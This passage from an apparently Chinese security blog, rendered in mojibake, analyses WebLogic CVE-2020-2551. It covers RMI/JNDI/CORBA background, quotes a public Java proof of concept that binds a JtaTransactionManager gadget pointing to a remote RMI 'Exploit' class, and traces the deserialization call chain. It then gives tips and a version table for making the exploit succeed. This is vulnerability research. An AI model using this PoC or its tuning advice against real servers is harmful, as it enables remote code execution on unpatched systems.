Invocationï¼‰æ˜¯Javaç¼–ç¨‹è¯­è¨€é‡Œï¼Œä¸€ç§ç”¨äºå®ç°è¿œç¨‹è¿‡ç¨‹è°ƒç”¨çš„åº”ç”¨ç¨‹åºç¼–ç¨‹æ¥å£ã€‚å®ƒä½¿å®¢æˆ·æœºä¸Šè¿è¡Œçš„ç¨‹åºå¯ä»¥è°ƒç”¨è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„å¯¹è±¡ã€‚è¿œç¨‹æ–¹æ³•è°ƒç”¨ç‰¹æ€§ä½¿Javaç¼–ç¨‹äººå‘˜èƒ½å¤Ÿåœ¨ç½‘ç»œç¯å¢ƒä¸­åˆ†å¸ƒæ“ä½œã€‚RMIå…¨éƒ¨çš„å®—æ—¨å°±æ˜¯å°½å¯èƒ½ç®€åŒ–è¿œç¨‹æ¥å£å¯¹è±¡çš„ä½¿ç”¨ã€‚<br>Javaè¿œç¨‹æ–¹æ³•åè®®ï¼ˆè‹±è¯­ï¼šJava Remote Method Protocolï¼ŒJRMPï¼‰æ˜¯ç‰¹å®šäºJavaæŠ€æœ¯çš„ã€ç”¨äºæŸ¥æ‰¾å’Œå¼•ç”¨è¿œç¨‹å¯¹è±¡çš„åè®®ã€‚è¿™æ˜¯è¿è¡Œåœ¨Javaè¿œç¨‹æ–¹æ³•è°ƒç”¨ï¼ˆRMIï¼‰ä¹‹ä¸‹ã€TCP/IPä¹‹ä¸Šçš„çº¿è·¯å±‚åè®®ï¼ˆè‹±è¯­ï¼šWire protocolï¼‰ã€‚</p><p>Javaå‘½åå’Œç›®å½•æ¥å£ï¼ˆJava Naming and Directory Interfaceï¼Œç¼©å†™JNDIï¼‰ï¼Œæ˜¯Javaçš„ä¸€ä¸ªç›®å½•æœåŠ¡åº”ç”¨ç¨‹åºæ¥å£ï¼ˆAPIï¼‰ï¼Œå®ƒæä¾›ä¸€ä¸ªç›®å½•ç³»ç»Ÿï¼Œå¹¶å°†æœåŠ¡åç§°ä¸å¯¹è±¡å…³è”èµ·æ¥ï¼Œä»è€Œä½¿å¾—å¼€å‘äººå‘˜åœ¨å¼€å‘è¿‡ç¨‹ä¸­å¯ä»¥ä½¿ç”¨åç§°æ¥è®¿é—®å¯¹è±¡ã€‚</p><p>ç›®å‰åŸºäº JNDI å®ç°çš„å‡ æœ¬ä¸º rmi ä¸ ldap çš„ç›®å½•æœåŠ¡ç³»ç»Ÿï¼Œæ„å»º rmi ã€ldap æ¯”è¾ƒå¸¸ç”¨çš„çš„å·¥å…·æœ‰ <a href="https://github.com/mbechler/marshalsec" target="_blank" rel="noopener">marshalsec</a> ã€<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a>ã€‚</p><p>æ›´å¤šä¿¡æ¯å»ºè®®æŸ¥é˜…<a href="https://www.anquanke.com/post/id/194384" target="_blank" rel="noopener">Java ä¸­ RMIã€JNDIã€LDAPã€JRMPã€JMXã€JMSé‚£äº›äº‹å„¿ï¼ˆä¸Šï¼‰</a>ã€‚</p><h3 id="ORBä¸GIOPã€IIOP"><a href="#ORBä¸GIOPã€IIOP" class="headerlink" title="ORBä¸GIOPã€IIOP"></a>ORBä¸GIOPã€IIOP</h3><p>ORBå…¨ç§°ï¼ˆObject Request Brokerï¼‰å¯¹è±¡è¯·æ±‚ä»£ç†ã€‚ORBæ˜¯ä¸€ä¸ªä¸­é—´ä»¶ï¼Œä»–åœ¨å¯¹è±¡é—´å»ºç«‹ä¸€ä¸ªCSå…³ç³»ï¼Œæˆ–è€…æ›´ç®€å•ç‚¹æ¥è¯´ï¼Œå°±æ˜¯ä¸€ä¸ªä»£ç†ã€‚å®¢æˆ·ç«¯å¯ä»¥å¾ˆç®€å•çš„é€šè¿‡è¿™ä¸ªåª’ä»‹ä½¿ç”¨æœåŠ¡å™¨å¯¹è±¡çš„æ–¹æ³•è€Œä¸éœ€è¦å…³æ³¨æœåŠ¡å™¨å¯¹è±¡æ˜¯åœ¨åŒä¸€å°æœºå™¨ä¸Šè¿˜æ˜¯é€šè¿‡è¿œç¨‹ç½‘ç»œè°ƒç”¨çš„ã€‚ORBæˆªè·è°ƒç”¨åè´Ÿè´£æ‰¾åˆ°ä¸€ä¸ªå¯¹è±¡ä»¥æ»¡è¶³è¯¥è¯·æ±‚ã€‚<br>GIOPå…¨ç§°ï¼ˆGeneral Inter-ORB Protocolï¼‰é€šç”¨å¯¹è±¡è¯·æ±‚åè®®ï¼Œå…¶åŠŸèƒ½ç®€å•æ¥è¯´å°±æ˜¯CORBAç”¨æ¥è¿›è¡Œæ•°æ®ä¼ è¾“çš„åè®®ã€‚GIOPé’ˆå¯¹ä¸åŒçš„é€šä¿¡å±‚æœ‰ä¸åŒçš„å…·ä½“å®ç°ï¼Œè€Œé’ˆå¯¹äºTCP/IPå±‚ï¼Œå…¶å®ç°åä¸ºIIOPï¼ˆInternet Inter-ORB Protocolï¼‰ã€‚æ‰€ä»¥è¯´é€šè¿‡TCPåè®®ä¼ è¾“çš„GIOPæ•°æ®å¯ä»¥ç§°ä¸ºIIOPã€‚</p><p>è€ŒORBä¸GIOPçš„å…³ç³»æ˜¯GIOPèµ·åˆå°±æ˜¯ä¸ºäº†æ»¡è¶³ORBé—´çš„é€šä¿¡çš„åè®®ã€‚æ‰€ä»¥ä¹Ÿå¯ä»¥è¯´ORBæ˜¯CORBAé€šä¿¡çš„åª’ä»‹ã€‚</p><h3 id="CORBA"><a href="#CORBA" class="headerlink" title="CORBA"></a>CORBA</h3><p>CORBAå…¨ç§°ï¼ˆCommon ObjectRequest Broker Architectureï¼‰ä¹Ÿå°±æ˜¯å…¬å…±å¯¹è±¡è¯·æ±‚ä»£ç†ä½“ç³»ç»“æ„ï¼Œæ˜¯OMGï¼ˆå¯¹è±¡ç®¡ç†ç»„ç»‡ï¼‰åˆ¶å®šçš„ä¸€ç§æ ‡å‡†çš„é¢å‘å¯¹è±¡åº”ç”¨ç¨‹åºä½“ç³»è§„èŒƒã€‚å…¶æå‡ºæ˜¯ä¸ºäº†è§£å†³ä¸åŒåº”ç”¨ç¨‹åºé—´çš„é€šä¿¡ï¼Œæ›¾æ˜¯åˆ†å¸ƒå¼è®¡ç®—çš„ä¸»æµæŠ€æœ¯ã€‚</p><p>ä¸€èˆ¬æ¥è¯´CORBAå°†å…¶ç»“æ„åˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼Œä¸ºäº†å‡†ç¡®çš„è¡¨è¿°ï¼Œæˆ‘å°†ç”¨å…¶åŸæœ¬çš„è‹±æ–‡åæ¥è¿›è¡Œè¡¨è¿°ï¼š</p><ul><li><code>naming service</code></li><li><code>client side</code></li><li><code>servant side</code></li></ul><p>è¿™ä¸‰éƒ¨åˆ†ç»„æˆäº†CORBAç»“æ„çš„åŸºç¡€ä¸‰å…ƒç´ ï¼Œè€Œé€šä¿¡è¿‡ç¨‹ä¹Ÿæ˜¯åœ¨è¿™ä¸‰æ–¹é—´å®Œæˆçš„ã€‚æˆ‘ä»¬çŸ¥é“CORBAæ˜¯ä¸€ä¸ªåŸºäºç½‘ç»œçš„æ¶æ„ï¼Œæ‰€ä»¥ä»¥ä¸Šä¸‰è€…å¯ä»¥è¢«éƒ¨ç½²åœ¨ä¸åŒçš„ä½ç½®ã€‚<code>servant side</code> å¯ä»¥ç†è§£ä¸ºä¸€ä¸ªæ¥æ”¶ <code>client side</code> è¯·æ±‚çš„æœåŠ¡ç«¯ï¼›<code>naming service</code> å¯¹äº <code>servant side</code> æ¥è¯´ç”¨äºæœåŠ¡æ–¹æ³¨å†Œå…¶æä¾›çš„æœåŠ¡ï¼Œå¯¹äº <code>client side</code> æ¥è¯´å®¢æˆ·ç«¯å°†ä» <code>naming service</code> æ¥è·å–æœåŠ¡æ–¹çš„ä¿¡æ¯ã€‚è¿™ä¸ªå…³ç³»å¯ä»¥ç®€å•çš„ç†è§£æˆç›®å½•ä¸ç« èŠ‚å…·ä½“å†…å®¹çš„å…³ç³»ï¼šç›®å½•å³ä¸º <code>naming service</code>ï¼Œ<code>servant side</code> å¯ä»¥ç†è§£ä¸ºå…·ä½“çš„å†…å®¹ï¼Œå†…å®¹éœ€è¦é¦–å…ˆåœ¨ç›®å½•é‡Œé¢è¿›è¡Œæ³¨å†Œï¼Œè¿™æ ·å½“ç”¨æˆ·æƒ³è¦è®¿é—®å…·ä½“å†…å®¹æ—¶åªéœ€è¦é¦–å…ˆåœ¨ç›®å½•ä¸­æŸ¥æ‰¾åˆ°å…·ä½“å†…å®¹æ‰€æ³¨å†Œçš„å¼•ç”¨ï¼ˆé€šå¸¸ä¸ºé¡µæ•°ï¼‰ï¼Œè¿™æ ·å°±å¯ä»¥åˆ©ç”¨è¿™ä¸ªå¼•ç”¨å¿«é€Ÿçš„æ‰¾åˆ°ç« èŠ‚å…·ä½“çš„å†…å®¹ã€‚</p><h2 id="ç¥å¥‡çš„7001ç«¯å£"><a href="#ç¥å¥‡çš„7001ç«¯å£" class="headerlink" title="ç¥å¥‡çš„7001ç«¯å£"></a>ç¥å¥‡çš„7001ç«¯å£</h2><p>é¦–å…ˆæˆ‘ä»¬æ¥åˆ†æ weblogic ç¥å¥‡çš„ 7001 ç«¯å£ï¼Œæ­£å¸¸æƒ…å†µä¸‹æˆ‘ä»¬é€šè¿‡ 7001 ç«¯å£å‘é€ HTTP åè®®æ—¶ä¼šå“åº” HTTP åè®®çš„å†…å®¹ï¼Œå‘é€ T3 åè®®çš„æ•°æ®åŒ…æ—¶å“åº” T3 çš„å“åº”æ•°æ®åŒ…ï¼Œå‘é€ IIOP åè®®çš„æ•°æ®åŒ…æ—¶å“åº” IIOP çš„æ•°æ®åŒ…ã€‚è¯¥ç«¯å£éå¸¸çš„ç¥å¥‡ï¼Œæˆ‘ä»¬é€šè¿‡ä»€ä¹ˆåè®®è®¿é—®è¯¥ç«¯å£è¯¥ç«¯å£ä¼šå“åº”å¯¹åº”çš„åè®®åŒ…å†…å®¹ã€‚</p><p><img src="https://img.zhiiyun.com/blog_28b7f813cb02fa6284f51bab6beb6c39" alt="HTTP åè®®"></p><p>é€šè¿‡æµè§ˆå™¨è¿›è¡Œè®¿é—® weblogic çš„ 7001 ç«¯å£å¯ä»¥å‘ç°å“åº”çš„åè®®ç±»å‹ä¹Ÿä¸ºHTTPã€‚</p><p><img src="https://img.zhiiyun.com/blog_b73711d96a80a6868a129fb74369b827" alt="IIOP åè®®"></p><p>ä¸Šå›¾é€šè¿‡ IIOP è¿›è¡Œå‘åŒ…å“åº”å†…å®¹ä¸ºä¸º IIOP å†…å®¹ä¿¡æ¯ï¼ŒIIOP æ˜¯ä¸€ç§é€šè¿‡ TCP/IP è¿æ¥äº¤æ¢ GIOP ï¼ˆé€šç”¨å¯¹è±¡è¯·æ±‚ä»£ç†é—´é€šä¿¡åè®®ï¼‰ä¿¡æ¯çš„åè®®ã€‚</p><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>è¯¥æ¼æ´ä¸»è¦æ˜¯å› ä¸º Webloigc é»˜è®¤å¼€æ”¾ IIOP åè®®ï¼Œå¹¶ä¸” <code>JtaTransactionManager</code> å¹¶æœªåšé»‘åå•è¿‡æ»¤å¯¼è‡´æ¼æ´å‘ç”Ÿï¼Œä»¥ä¸‹ä¸ºæ•´ä¸ªæµ‹è¯• POCï¼ˆè¯¥ POC æ¥è‡ªäº’è”ç½‘ï¼‰ï¼Œåç»­ä»£ç è°ƒè¯•ä¹Ÿæ˜¯åŸºäºè¯¥ä»£ç è¿›è¡Œè°ƒè¯•ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        String ip = &quot;127.0.0.1&quot;;</span><br><span class="line">        String port = &quot;7001&quot;;</span><br><span class="line">        Hashtable&lt;String, String&gt; env = new Hashtable&lt;String, String&gt;();</span><br><span class="line">        env.put(&quot;java.naming.factory.initial&quot;, &quot;weblogic.jndi.WLInitialContextFactory&quot;);</span><br><span class="line">        env.put(&quot;java.naming.provider.url&quot;, String.format(&quot;iiop://%s:%s&quot;, ip, port));</span><br><span class="line">        Context context = new InitialContext(env);</span><br><span class="line">        // get Object to Deserialize</span><br><span class="line">        JtaTransactionManager jtaTransactionManager = new JtaTransactionManager();</span><br><span class="line">        jtaTransactionManager.setUserTransactionName(&quot;rmi://127.0.0.1:1099/Exploit&quot;);</span><br><span class="line">        Remote remote = Gadgets.createMemoitizedProxy(Gadgets.createMap(&quot;pwned&quot;, jtaTransactionManager), Remote.class);</span><br><span class="line">        context.bind(&quot;hello&quot;, remote);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>åŸºäºå…¬å¸ƒçš„POCï¼Œæ•´ä¸ªåˆ©ç”¨è¿‡ç¨‹å°±ä¸ºï¼š</p><ol><li>é€šè¿‡ Weblogic çš„IPä¸ç«¯å£é€šè¿‡ <code>weblogic.jndi.WLInitialContextFactory</code> ç±»è¿›è¡Œ IIOP åè®®æ•°æ®äº¤äº’ã€‚</li><li>åŸºäº <code>JtaTransactionManager</code> è®¾ç½® RMI åŠ è½½åœ°å€ã€‚</li><li>é€šè¿‡ <code>ysoserial</code> æ„å»º Gadgets å¹¶ä¸”é€šè¿‡ IIOP è¿›è¡Œç»‘å®šï¼Œå¹¶ä¸”è§¦å‘æ¼æ´ã€‚</li></ol><p><img src="https://img.zhiiyun.com/blog_3682760c6c580bb42481579952e4bea4" alt=""></p><h2 id="weblogic-è§£ææµç¨‹"><a href="#weblogic-è§£ææµç¨‹" class="headerlink" title="weblogic è§£ææµç¨‹"></a>weblogic è§£ææµç¨‹</h2><p><strong>æ³¨ï¼šweblogicæµç¨‹æ˜¯åŸºäº weblogic 12.2.1.3.0 è¿›è¡Œæµ‹è¯•ç ”ç©¶ã€‚</strong></p><h3 id="weblogic-è°ƒè¯•"><a href="#weblogic-è°ƒè¯•" class="headerlink" title="weblogic è°ƒè¯•"></a>weblogic è°ƒè¯•</h3><p>ä¿®æ”¹ç›®å½• <code>user_project/domains/bin</code> ç›®å½•ä¸­ <code>setDomainEnv.cmd</code> æˆ–è€… <code>setDomainEnv.sh</code>  æ–‡ä»¶ï¼ŒåŠ <code>if %debugFlag == &quot;false&quot;%</code> ä¹‹å‰åŠ å…¥ <code>set debugFlag=true</code>ï¼Œå¹¶ä¸”é‡æ–°å¯åŠ¨ weblogicï¼Œç„¶åå°† weblogic å¤åˆ¶åˆ° idea é¡¹ç›®ä¸­ï¼Œå¹¶ä¸”æ·»åŠ  Libraries</p><p><img src="https://img.zhiiyun.com/blog_e13383958b9d71be86b08ed49d973fbc" alt=""></p><p>æ–°å¢ Remote æ–¹å¼è¿›è¡Œè¿œç¨‹è°ƒè¯•ã€‚</p><p><img src="https://img.zhiiyun.com/blog_2ac41e50502f2252618ddb9574b633f1" alt=""></p><p>docker è°ƒè¯•å¯å‚è€ƒ <a href="https://www.cnblogs.com/ph4nt0mer/archive/2019/10/31/11772709.html" target="_blank" rel="noopener">https://www.cnblogs.com/ph4nt0mer/archive/2019/10/31/11772709.html</a></p><h3 id="è§£æåˆ°åºåˆ—åŒ–"><a href="#è§£æåˆ°åºåˆ—åŒ–" class="headerlink" title="è§£æåˆ°åºåˆ—åŒ–"></a>è§£æåˆ°åºåˆ—åŒ–</h3><p>å‰é¢æˆ‘ä»¬è¯´åˆ° 7001 ç¥å¥‡çš„ç«¯å£ï¼Œweblogic é»˜è®¤æ˜¯ 7001 ç«¯å£è¿›è¡Œæ¥æ”¶ IIOP è¯·æ±‚ã€‚å¯ä»¥é€šè¿‡ <code>com.oracle.weblogic.iiop.jar!weblogic.iiop.ConnectionManager#dispatch</code> å¯ä»¥çœ‹åˆ°æ‰€æœ‰ IIOP çš„è¯·æ±‚ä¿¡æ¯ã€‚<br><img src="https://img.zhiiyun.com/blog_d53edfc17c07ffb334ae3eafe8fd5c78" alt=""></p><p>ç„¶ååœ¨ <code>weblogic.rmi.internal.wls.WLSExecuteRequest#run</code> è¿›è¡Œè°ƒç”¨ <code>weblogic.rmi.internal.BasicServerRef#handleRequest</code> ã€‚</p><p><img src="https://img.zhiiyun.com/blog_3752224b78e977271b3a5177d9568d85" alt=""></p><p>ç„¶ååœ¨é€šè¿‡ <code>weblogic.rmi.internal.BasicServerRef#handleRequest</code> è°ƒç”¨ <code>weblogic.rmi.internal.BasicServerRef#handleRequest</code> æœ€ç»ˆè°ƒç”¨ <code>invoker.invoke</code> ã€‚</p><p><img src="https://img.zhiiyun.com/blog_22497afdc34ce1e85fad55e3a617c0cf" alt=""></p><p>ä»¥ä¸‹ä¸ºåˆ° <code>invoker.invoke</code> çš„è°ƒç”¨é“¾ï¼š</p><p><img src="https://img.zhiiyun.com/blog_1e47fc1a0b7d0aaa97440e5a06aa2c78" alt=""></p><p>æœ€ç»ˆå®ç°çš„æ–¹æ³•åœ¨ <code>com.weblogic.rmi.cluster.ClusterableServerRef#invoke</code> æ–¹æ³•ä¸­ã€‚</p><p><img src="https://img.zhiiyun.com/blog_b25c9e665882e168c2b868eeca21060a" alt=""></p><p>è¿›å…¥è¯¥æ–¹æ³•ä¹‹åä¼š <code>objectMethods.get(iioprequest.getMethod())</code> è¿›è¡Œè·å–æ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ºç©ºçš„è¯ä¼šè°ƒç”¨<code>this.delegate._invoke(iioprequest.getMethod(), iioprequest.getInputStream(), rh)</code> è¿›è¡Œå¤„ç†ï¼Œç”±äºåœ¨å‘é€åŒ…çš„æ—¶å€™æ‰§è¡Œçš„æ“ä½œç±»å‹ <code>bind_any()</code> ï¼Œè¯¥ç±»å‹ä¸å­˜åœ¨ <code>objectMethods</code> å˜é‡ä¸­æœ€ç»ˆä¼šè°ƒç”¨ <code>this.delegate._invoke</code> ï¼Œå…·ä½“å®ç°çš„ç±»ä¸º<code>weblogic.corba.cos.naming._NamingContextAnyImplBase#_invoke</code>ï¼š</p><p><img src="https://img.zhiiyun.com/blog_5c05db4dc1b2d1c37c50245c0e661043" alt=""></p><p><img src="https://img.zhiiyun.com/blog_00d3c202b37382b573328eabd95d4eef" alt=""></p><p>åœ¨ <code>_invoke</code> æ–¹æ³•ä¸­è·å–æ‰§è¡Œçš„æ–¹æ³•ï¼Œæˆ‘ä»¬æ‰§è¡Œçš„ <code>bind_any</code> æœ€ç»ˆä¼šæ‰§è¡Œåˆ° <code>case 0</code> çš„ä»£ç å—ä¸­ï¼Œæœ€ç»ˆè°ƒç”¨<code>n = WNameHelper.read(in);$result = in.read_any();this.bind_any(n, $result);out = $rh.createReply();</code>ä»£ç å—ã€‚</p><p><img src="https://img.zhiiyun.com/blog_c32bb68166ec5307c078462620e3513e" alt=""></p><p>å…¶ä¸­ <code>WNameHelper.read(in)</code> é€šè¿‡è¯»å– <code>IOR</code> ä¸­çš„ä¿¡æ¯ç”¨äºæ³¨å†Œåˆ° <code>ORB</code> çš„æµç¨‹ä¸­ã€‚</p><p><code>in.read_any()</code> æœ€åæ‰§è¡Œ <code>weblogic.corba.idl.AnyImpl#read_value_internal</code> å¤„ç†å¯¹åº”çš„æµç¨‹ï¼š</p><p><img src="http://img.zhiiyun.com/blog_288ba72718ded1f227a9a72cdd9247ac" alt=""></p><p><img src="http://img.zhiiyun.com/blog_53a49690d047ee771853534cab39a9aa" alt=""></p><p>ä»¥ä¸‹ä¸º <code>read_any</code> åˆ° <code>read_value_internal</code> çš„è°ƒç”¨é“¾ï¼š</p><p><img src="https://img.zhiiyun.com/blog_035306e2c706fe64a96726490029dbee" alt=""></p><p>å¯ä»¥çœ‹åˆ°æœ€åè¿›è¡Œ <code>weblogic.corba.idl.AnyImpl#read_value()</code> è¿›è¡Œè¯»å–ååºåˆ—åŒ–ååºåˆ—åŒ–ï¼Œç„¶åé€šè¿‡ä»¥ä¸‹è°ƒç”¨é“¾æ‰§è¡Œåå°„å¹¶ä¸”é€šè¿‡  <code>weblogic.iiop.IIOPInputStream#read_value</code> é€šè¿‡åå°„è¿›è¡Œè·å–å®ä¾‹ã€‚</p><p> <img src="https://img.zhiiyun.com/blog_09cb56cb425d7171075c5bf523a2b432" alt=""></p><p><img src="https://img.zhiiyun.com/blog_1f233fce8d7ca55cf19a603f397b3e81" alt=""></p><p>é€šè¿‡å®ä¾‹åŒ–ä¹‹å <code>Serializable news = (Serializable)ValueHandlerImpl.readValue(this, osc, s);</code> ç„¶åé€šè¿‡<code>weblogic.iiop.ValueHandlerImpl#readValue</code>è¿›è¡Œè¯»å–å†…å®¹</p><p><img src="https://img.zhiiyun.com/blog_b4ea51fd6ac2c815c1c17572b076f8dd" alt=""></p><p>!<img src="https://img.zhiiyun.com/blog_b84d0479d2129c19d1d1d7fc5fc6fcc3" alt=""></p><p><img src="https://img.zhiiyun.com/blog_3ec65df3cd07e5af3129ee7e935c7751" alt=""></p><p>åŸºäºä¹‹å‰ <code>JtaTransactionManager</code> è¿›è¡Œè¯»å–æµå†…å®¹è¿›è¡Œ <code>this.readObjectMethod.invoke(obj, in)</code> ç„¶åè¿›å…¥ <code>JtaTransactionManager</code> å¤„ç†æµç¨‹<br><img src="https://img.zhiiyun.com/blog_57155da10133ed6aa20f1f18accc8900" alt=""></p><p><img src="https://img.zhiiyun.com/blog_bba9ed64ae1b78398b9d34c7c2ad4814" alt=""></p><p>è¿›å…¥ <code>com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager#readObject</code> æ•´ä¸ªæµç¨‹ä¸ºï¼š</p><p><img src="https://img.zhiiyun.com/blog_9521a6476096ffd90086688f2e942144" alt=""></p><p>è¿›å…¥ <code>com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager#readObject</code> åé¦–å…ˆä¼šé»˜è®¤è¯»å– <code>defaultReadObject</code> ç„¶ååˆ›å»º <code>JndiTemplate</code> æä¾› <code>this.initUserTransactionAndTransactionManager</code> è¿›è¡Œä½¿ç”¨æ³¨å…¥è¿œç¨‹ JNDI è¿æ¥ã€‚</p><p><img src="https://img.zhiiyun.com/blog_bba9ed64ae1b78398b9d34c7c2ad4814" alt=""></p><p><code>this.initUserTransactionAndTransactionManager</code> ä¼šè¿›è¡Œè°ƒç”¨è¿œç¨‹çš„ JNDI è¿æ¥</p><p><img src="https://img.zhiiyun.com/blog_2b7f5121aef84e64fed47283d8e42f85" alt=""></p><p><img src="https://img.zhiiyun.com/blog_3fe302d36194cad2358456f8db748846" alt=""></p><p>çœ‹åˆ° <code>this.getJndiTemplate().lookup</code> ï¼Œæœ€ç»ˆåœ¨ <code>com.bea.core.repackaged.springframework.jndi.JndiTemplate#lookup</code> è¿›è¡Œæ“ä½œè‡³æ­¤ç»“æŸã€‚</p><p><img src="https://img.zhiiyun.com/blog_0a32c7d702549771652d25c20deab969" alt=""></p><p>åŒæ ·å·²ç»è§¦å‘å¹¶ä¸”åŠ è½½è¿œç¨‹çš„<code>Class</code> ç±»ã€‚</p><p><img src="https://img.zhiiyun.com/blog_d09a2d1da28207a53f420390a3d8bd5b" alt=""></p><h2 id="POC-çš„ä¸è¶³ä¹‹å¤„"><a href="#POC-çš„ä¸è¶³ä¹‹å¤„" class="headerlink" title="POC çš„ä¸è¶³ä¹‹å¤„"></a>POC çš„ä¸è¶³ä¹‹å¤„</h2><p>åœ¨èƒŒæ™¯ä¸­ï¼Œç¬”è€…è¯´æ˜ CVE-2020-2551 æ¼æ´å…¬å¼€çš„ POC ï¼Œæœ‰éƒ¨åˆ†ä¸è¶³å¯¼è‡´æ¼æ´æ£€æµ‹æ•ˆç‡é™ä½ï¼Œä¸‹é¢ç« èŠ‚æˆ‘ä»¬æ¥è¿›è¡Œæ·±å…¥åˆ†æã€‚</p><h3 id="class-ç¼–è¯‘é—®é¢˜"><a href="#class-ç¼–è¯‘é—®é¢˜" class="headerlink" title="class ç¼–è¯‘é—®é¢˜"></a>class ç¼–è¯‘é—®é¢˜</h3><p>åœ¨å—å½±å“ Oracle WebLogic Server 10.3.6.0.0 ä¸ JDK ç‰ˆæœ¬æœ‰éå¸¸å¤§çš„å…³ç³»ï¼Œå¦‚æœè¯¥æœºå™¨ç‰ˆæœ¬ä¸º 1.6 ç‰ˆæœ¬å¿…é¡»è¦ä¸º 1.6 ï¼Œå¦‚æœé«˜äºæ¬¡ç‰ˆæœ¬ä¼šæ‰§è¡Œå¤±è´¥ï¼ˆä½ç‰ˆæœ¬çš„ JDK ä¸å…¼å®¹é«˜ç‰ˆæœ¬çš„ JDK ï¼‰ï¼Œä½†æ˜¯æ‰€æœ‰ LDAP ä»¥åŠ HTTP è¯·æ±‚ä¿¡æ¯ä»ç„¶æœ‰æ•ˆã€‚</p><p>è§£å†³æ–¹æ¡ˆä¸ºåˆ©ç”¨ POC è®¾ç½®ç¼–è¯‘ç‰ˆæœ¬æ¥è¿›è¡Œå¤„ç†ï¼š</p><p> <code>javac Poc.java -source 1.6 -target 1.6</code></p><h3 id="JDK-ç‰ˆæœ¬é—®é¢˜"><a href="#JDK-ç‰ˆæœ¬é—®é¢˜" class="headerlink" title="JDK ç‰ˆæœ¬é—®é¢˜"></a>JDK ç‰ˆæœ¬é—®é¢˜</h3><p>åœ¨å®‰è£… Oracle WebLogic Server æ—¶éœ€è¦è¿›è¡Œéœ€è¦æŒ‡å®š JDK ç‰ˆæœ¬è¿›è¡Œå®‰è£…ï¼Œå¦‚æœªæœ‰ JDK ä¼šå¯¼è‡´å®‰è£…å¤±è´¥ï¼Œå®‰è£…æ—¶çš„ JDK æœ‰éå¸¸å¤§çš„å…³ç³»ï¼Œè¿™æ¬¡çš„æ¼æ´ä¸»è¦æ˜¯é€šè¿‡ <code>JtaTransactionManager</code> æ¥è¿›è¡ŒåŠ è½½ LDAP åè®®çš„å†…å®¹ï¼Œæ—©åœ¨ JDK 1.7 æ—¶ Oracle å®˜æ–¹é’ˆå¯¹ RMI ã€ LDAP è¿›è¡Œäº†é™åˆ¶ï¼Œæ‰€åœ¨åœ¨ä½¿ç”¨æ—¶å°½é‡ä½¿ç”¨ LDAP åè®®ã€‚</p><p><img src="https://img.zhiiyun.com/blog_2f1466808c9b9238487bfb5b5291241c" alt=""></p><h3 id="Weblogic-ç‰ˆæœ¬é—®é¢˜"><a href="#Weblogic-ç‰ˆæœ¬é—®é¢˜" class="headerlink" title="Weblogic ç‰ˆæœ¬é—®é¢˜"></a>Weblogic ç‰ˆæœ¬é—®é¢˜</h3><p>ç»è¿‡æµ‹è¯•ç ”ç©¶å‘ç°ä»¥ä¸‹æƒ…å†µï¼š</p><table><thead><tr><th style="text-align:center">jar ç‰ˆæœ¬</th><th style="text-align:center">weblogic ç‰ˆæœ¬</th><th style="text-align:center">æˆåŠŸæƒ…å†µ</th></tr></thead><tbody><tr><td style="text-align:center">10.3.6.0.0</td><td style="text-align:center">10.3.6.0.0</td><td style="text-align:center">æˆåŠŸ</td></tr><tr><td style="text-align:center">10.3.6.0.0</td><td style="text-align:center">12.1.3.0.0</td><td style="text-align:center">æˆåŠŸ</td></tr><tr><td style="text-align:center">10.3.6.0.0</td><td style="text-align:center">12.2.1.3.0</td><td style="text-align:center">å¤±è´¥</td></tr><tr><td style="text-align:center">10.3.6.0.0</td><td style="text-align:center">12.2.1.4.0</td><td style="text-align:center">å¤±è´¥</td></tr><tr><td style="text-align:center">12.1.3.0.0</td><td style="text-align:center">10.3.6.0.0</td><td style="text-align:center">æˆåŠŸ</td></tr><tr><td style="text-align:center">12.1.3.0.0</td><td style="text-align:center">12.1.3.0.0</td><td style="text-align:center">æˆåŠŸ</td></tr><tr><td style="text-align:center">12.1.3.0.0</td><td style="text-align:center">12.2.1.3.0</td><td style="text-align:center">å¤±è´¥</td></tr><tr><td style="text-align:center">12.1.3.0.0</td><td style="text-align:center">12.2.1.4.0</td><td style="text-align:center">å¤±è´¥</td></tr><tr><td style="text-align:center">12.2.1.3.0</td><td style="text-align:center">10.3.6.0.0</td><td style="text-align:center">å¤±è´¥</td></tr><tr><td style="text-align:center">12.2.1.3.0</td><td style="text-align:center">12.1.3.0.0</td><td style="text-align:center">å¤±è´¥</td></tr><tr><td style="text-align:center">12.2.1.3.0</td><td style="text-align:center">12.2.1.3.0</td><td style="text-align:center">æˆåŠŸ</td></tr><tr><td style="text-align:center">12.2.1.3.0</td><td style="text-align:center">12.2.1.4.0</td><td style="text-align:center">æˆåŠŸ</td></tr><tr><td style="text-align:center">12.2.1.4.0</td><td style="text-align:center">10.3.6.0.0</td><td style="text-align:center">å¤±è´¥</td></tr><tr><td style="text-align:center">12.2.1.4.0</td><td style="text-align:center">12.1.3.0.0</td><td style="text-align:center">å¤±è´¥</td></tr><tr><td style="text-align:center">12.2.1.4.0</td><td style="text-align:center">12.2.1.3.0</td><td style="text-align:center">æˆåŠŸ</td></tr><tr><td style="text-align:center">12.2.1.4.0</td><td style="text-align:center">12.2.1.4.0</td><td style="text-align:center">æˆåŠŸ</td></tr></tbody></table><p>æœ€åæ€»ç»“ 10.3.6.0.0 æˆ– 12.1.3.0.0 ç‰ˆæœ¬æµ‹è¯•æˆåŠŸ 10.3.6.0.0 å’Œ 12.1.3.0.0ï¼Œ12.2.1.3.0 æˆ– 12.2.1.4.0 ç‰ˆæœ¬æµ‹è¯•æˆåŠŸ 12.2.1.3.0 å’Œ 